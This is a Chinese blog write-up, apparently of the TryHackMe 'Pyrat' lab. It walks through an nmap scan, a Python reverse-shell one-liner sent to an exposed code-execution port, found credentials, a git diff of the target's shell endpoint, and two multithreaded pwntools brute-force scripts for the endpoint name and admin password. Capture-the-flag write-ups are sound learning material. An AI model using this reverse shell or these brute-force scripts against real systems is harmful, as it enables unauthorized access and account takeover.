@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="首先进行端口扫描： nmap -T4 -n -sC -sV -Pn -p- 10.10.123.193 12345678910111213141516171819201. -T4-T 选项控制扫描的速度和激进程度，范围是 0 到 5，数字越大，扫描越快、越激进。-T4 表示将扫描的速度设置为较高（但不至于过于激进），通常是平衡速度与准确度的好选择。2. -n-n 选项用于 禁用域名解析，即不进行反">
+<meta property="og:type" content="article">
+<meta property="og:title" content="皮拉特">
+<meta property="og:url" content="http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/index.html">
+<meta property="og:site_name" content="juju">
+<meta property="og:description" content="首先进行端口扫描： nmap -T4 -n -sC -sV -Pn -p- 10.10.123.193 12345678910111213141516171819201. -T4-T 选项控制扫描的速度和激进程度，范围是 0 到 5，数字越大，扫描越快、越激进。-T4 表示将扫描的速度设置为较高（但不至于过于激进），通常是平衡速度与准确度的好选择。2. -n-n 选项用于 禁用域名解析，即不进行反">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745233915371-f156def4-097d-4fd3-926b-e34d14df68fe.png">
+<meta property="og:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745234195621-069513ca-4cab-41ee-a9b3-e28496687839.png">
+<meta property="og:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745290545316-aa95f15d-0a0f-46ae-bc17-30fef363f7ac.png">
+<meta property="og:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745290786617-8949b6e7-5e16-4c60-871d-d9d5e7a69e81.png">
+<meta property="og:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745290930170-0c81d9cb-4d5c-449f-8094-ab0b8de6fc70.png">
+<meta property="og:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745292471204-6a3311cf-c566-4f02-8071-890b4c12ace6.png">
+<meta property="og:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745292439093-d67ca2b1-ea33-44dc-871b-cd80266aa41e.png">
+<meta property="og:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745292892930-38b5b558-7130-4888-98da-18b8f86de4fb.png">
+<meta property="article:published_time" content="2025-04-22T04:39:42.000Z">
+<meta property="article:modified_time" content="2025-04-22T04:40:25.638Z">
+<meta property="article:author" content="juju">
+<meta property="article:tag" content="THM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745233915371-f156def4-097d-4fd3-926b-e34d14df68fe.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/head.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>皮拉特</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/04/13/light/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&text=皮拉特"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&is_video=false&description=皮拉特"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=皮拉特&body=Check out this article: http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&name=皮拉特&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&t=皮拉特"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        皮拉特
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">juju</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-22T04:39:42.000Z" class="dt-published" itemprop="datePublished">2025-04-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/THM/" rel="tag">THM</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>首先进行端口扫描：</p>
+<p>nmap -T4 -n -sC -sV -Pn -p- 10.10.123.193</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. -T4</span><br><span class="line">-T 选项控制扫描的速度和激进程度，范围是 0 到 5，数字越大，扫描越快、越激进。</span><br><span class="line"></span><br><span class="line">-T4 表示将扫描的速度设置为较高（但不至于过于激进），通常是平衡速度与准确度的好选择。</span><br><span class="line"></span><br><span class="line">2. -n</span><br><span class="line">-n 选项用于 禁用域名解析，即不进行反向 DNS 查找。这样可以加速扫描过程，尤其是当你只关心 IP 地址而不需要知道主机名时。</span><br><span class="line"></span><br><span class="line">3. -sC</span><br><span class="line">-sC 选项启用 默认脚本扫描。Nmap 有一系列内置的脚本，用于执行常见的安全检查（例如检查漏洞、获取服务版本信息等）。</span><br><span class="line">这些默认脚本涵盖了基本的服务识别、漏洞扫描等，可以帮助你更全面地了解目标系统。</span><br><span class="line"></span><br><span class="line">4. -sV</span><br><span class="line">-sV 选项用于进行 服务版本检测，Nmap 会尝试识别目标主机开放端口上的服务和版本信息。这对于确认目标系统的服务版本并寻找已知漏洞非常有用。</span><br><span class="line"></span><br><span class="line">5. -Pn</span><br><span class="line">-Pn 选项跳过 主机发现，即不进行 ICMP 探测（ping 扫描）。这意味着 Nmap 会认为目标主机是在线的，并且不会尝试通过发送 ICMP 请求来确认主机是否可达。这个选项适用于防火墙屏蔽 ICMP 请求的情况，或者当你确定目标主机是在线时。</span><br><span class="line"></span><br><span class="line">6. -p-</span><br><span class="line">-p- 选项告诉 Nmap 扫描 所有端口，即从 1 到 65535 端口。这意味着扫描目标主机上所有可能的端口，而不仅仅是常见的端口（如 80, 443, 22 等</span><br></pre></td></tr></table></figure>
+
+<p>最后的话是扫描出来了：80，8000这两个端口，然后对8000这个端口发送http请求，收到相应：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Try a more basic connection </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745233915371-f156def4-097d-4fd3-926b-e34d14df68fe.png" alt="img"></p>
+<p>他这个提示我们使用基础的连接：使用nc连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─# nc 10.10.123.193 8000</span><br><span class="line">ls</span><br><span class="line">name &#x27;ls&#x27; is not defined</span><br><span class="line">whoami</span><br><span class="line">name &#x27;whoami&#x27; is not defined</span><br></pre></td></tr></table></figure>
+
+<p>同时最后发现他是可以执行python代码的。</p>
+<p><img src="/../image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745234195621-069513ca-4cab-41ee-a9b3-e28496687839.png" alt="img"></p>
+<p>利用这一点，我们可以发送一个python反向shell有效载荷获取一个shell www-data</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.17.33.100&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745290545316-aa95f15d-0a0f-46ae-bc17-30fef363f7ac.png" alt="img"></p>
+<p>然后获取一个稳定的shell：</p>
+<p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>最后在&#x2F;opt目录下发现了一个东西</p>
+<p><img src="/../image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745290786617-8949b6e7-5e16-4c60-871d-d9d5e7a69e81.png" alt="img"></p>
+<p>一个账号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">think</span><br><span class="line">_TH1NKINGPirate$_</span><br></pre></td></tr></table></figure>
+
+<p>最后通过这个账号登录进去：拿到user.txt</p>
+<p><img src="/../image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745290930170-0c81d9cb-4d5c-449f-8094-ab0b8de6fc70.png" alt="img"></p>
+<p>后续在翻看邮箱时候发现：root用户给think装了一个rat<img src="/../image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745292471204-6a3311cf-c566-4f02-8071-890b4c12ace6.png" alt="img"></p>
+<p>查看进程，筛选 .py 后缀的文件。看有没有运行的rat</p>
+<p><img src="/../image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745292439093-d67ca2b1-ea33-44dc-871b-cd80266aa41e.png" alt="img"></p>
+<p>回到git存储库并检查所做的提交，可以看到一个提交。</p>
+<p><img src="/../image/%E7%9A%AE%E6%8B%89%E7%89%B9/1745292892930-38b5b558-7130-4888-98da-18b8f86de4fb.png" alt="img"></p>
+<p>然后使用：</p>
+<p>git show 0a3c36d66369fd4b07ddca72e5379461a63470bf   查看详细信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">think@Pyrat:/opt/dev$ git show 0a3c36d66369fd4b07ddca72e5379461a63470bf  </span><br><span class="line">git show 0a3c36d66369fd4b07ddca72e5379461a63470bf  </span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">-  (press RETURN)    </span><br><span class="line">commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -&gt; master)</span><br><span class="line">Author: Jose Mario &lt;josemlwdf@github.com&gt;</span><br><span class="line">Date:   Wed Jun 21 09:32:14 2023 +0000</span><br><span class="line"></span><br><span class="line">    Added shell endpoint</span><br><span class="line"></span><br><span class="line">diff --git a/pyrat.py.old b/pyrat.py.old</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..ce425cf</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/pyrat.py.old</span><br><span class="line">@@ -0,0 +1,27 @@</span><br><span class="line">+...............................................</span><br><span class="line">+</span><br><span class="line">+def switch_case(client_socket, data):</span><br><span class="line">+    if data == &#x27;some_endpoint&#x27;:</span><br><span class="line">+        get_this_enpoint(client_socket)</span><br><span class="line">+    else:</span><br><span class="line">+        # Check socket is admin and downgrade if is not aprooved</span><br><span class="line">+        uid = os.getuid()</span><br><span class="line">+        if (uid == 0):</span><br><span class="line">+            change_uid()</span><br><span class="line">+</span><br><span class="line">:</span><br><span class="line">+        if data == &#x27;shell&#x27;:</span><br><span class="line">:</span><br><span class="line">+            shell(client_socket)</span><br><span class="line">:</span><br><span class="line">+        else:</span><br><span class="line">:</span><br><span class="line">+            exec_python(client_socket, data)</span><br><span class="line">:</span><br><span class="line">+</span><br><span class="line">:</span><br><span class="line">+def shell(client_socket):</span><br><span class="line">:</span><br><span class="line">+    try:</span><br><span class="line">:</span><br><span class="line">+        import pty</span><br><span class="line">:</span><br><span class="line">+        os.dup2(client_socket.fileno(), 0)</span><br><span class="line">:</span><br><span class="line">+        os.dup2(client_socket.fileno(), 1)</span><br><span class="line">:</span><br><span class="line">+        os.dup2(client_socket.fileno(), 2)</span><br><span class="line">:</span><br><span class="line">+        pty.spawn(&quot;/bin/sh&quot;)</span><br><span class="line">:</span><br><span class="line">+    except Exception as e:</span><br><span class="line">:</span><br><span class="line">+        send_data(client_socket, e</span><br></pre></td></tr></table></figure>
+
+<p>然后开启python服务，写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import remote, context</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">target_ip = &quot;10.10.98.190&quot;</span><br><span class="line">target_port = 8000</span><br><span class="line">wordlist = &quot;/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt&quot;</span><br><span class="line">stop_flag = threading.Event()</span><br><span class="line">num_threads = 100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_force_input(words):</span><br><span class="line">    context.log_level = &quot;error&quot;</span><br><span class="line">    r = remote(target_ip, target_port)</span><br><span class="line">    for word in words:</span><br><span class="line">        if stop_flag.is_set():</span><br><span class="line">            r.close()</span><br><span class="line">            return</span><br><span class="line">        if word == &quot;shell&quot;:</span><br><span class="line">            continue</span><br><span class="line">        r.sendline(word.encode())</span><br><span class="line">        output = r.recvline()</span><br><span class="line">        if b&#x27;not defined&#x27; not in output and b&#x27;&lt;string&gt;&#x27; not in output and output != b&#x27;\n&#x27;:</span><br><span class="line">                stop_flag.set()</span><br><span class="line">                print(f&quot;[+] Input found: &#123;word&#125;&quot;)</span><br><span class="line">                print(f&quot;[+] Output recieved: &#123;output&#125;&quot;)</span><br><span class="line">                r.close()</span><br><span class="line">                return</span><br><span class="line">    r.close()</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    words = [line.strip() for line in open(wordlist, &quot;r&quot;).readlines()]</span><br><span class="line">    words_length = len(words)</span><br><span class="line">    step = (words_length + num_threads - 1) // num_threads</span><br><span class="line">    threads = []</span><br><span class="line">    for i in range(num_threads):</span><br><span class="line">        start = i * step</span><br><span class="line">        end = min(start + step, words_length)</span><br><span class="line">        if start &lt; words_length:</span><br><span class="line">            thread = threading.Thread(target=brute_force_input, args=(words[start:end],))</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            thread.start()</span><br><span class="line">    for thread in threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>通过wget下载，然后运行找到账号admin，接着找密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import remote, context</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">target_ip = &quot;10.10.98.190&quot;</span><br><span class="line">target_port = 8000</span><br><span class="line">wordlist = &quot;/usr/share/seclists/Passwords/500-worst-passwords.txt&quot;</span><br><span class="line">stop_flag = threading.Event()</span><br><span class="line">num_threads = 100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_force_pass(passwords):</span><br><span class="line">    context.log_level = &quot;error&quot;</span><br><span class="line">    r = remote(target_ip, target_port)</span><br><span class="line">    for i in range(len(passwords)):</span><br><span class="line">        if stop_flag.is_set():</span><br><span class="line">            r.close()</span><br><span class="line">            return</span><br><span class="line">        if i % 3 == 0:</span><br><span class="line">            r.sendline(b&quot;admin&quot;)</span><br><span class="line">            r.recvuntil(b&quot;Password:\n&quot;)</span><br><span class="line">        r.sendline(passwords[i].encode())</span><br><span class="line">        try:</span><br><span class="line">            if b&quot;shell&quot; in r.recvline(timeout=0.5):</span><br><span class="line">                stop_flag.set()</span><br><span class="line">                print(f&quot;[+] Password found: &#123;passwords[i]&#125;&quot;)</span><br><span class="line">                r.close()</span><br><span class="line">                return</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    r.close()</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    passwords = [line.strip() for line in open(wordlist, &quot;r&quot;).readlines()]</span><br><span class="line">    passwords_length = len(passwords)</span><br><span class="line">    step = (passwords_length + num_threads - 1) // num_threads</span><br><span class="line">    threads = []</span><br><span class="line">    for i in range(num_threads):</span><br><span class="line">        start = i * step</span><br><span class="line">        end = min(start + step, passwords_length)</span><br><span class="line">        if start &lt; passwords_length:</span><br><span class="line">            thread = threading.Thread(target=brute_force_pass, args=(passwords[start:end],))</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            thread.start()</span><br><span class="line">    for thread in threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>最后通过nc连接，输入admin，进行登录，最后拿root</p>
+
+  </div>
+</article>
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: '0cD8XYS5aRoaPXBQ2dkwSoOI-gzGzoHsz',
+            appKey: 'UD7mUoaxqx0jyMaDNVNDgTpN',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&text=皮拉特"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&is_video=false&description=皮拉特"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=皮拉特&body=Check out this article: http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&title=皮拉特"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&name=皮拉特&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/22/%E7%9A%AE%E6%8B%89%E7%89%B9/&t=皮拉特"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    juju
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
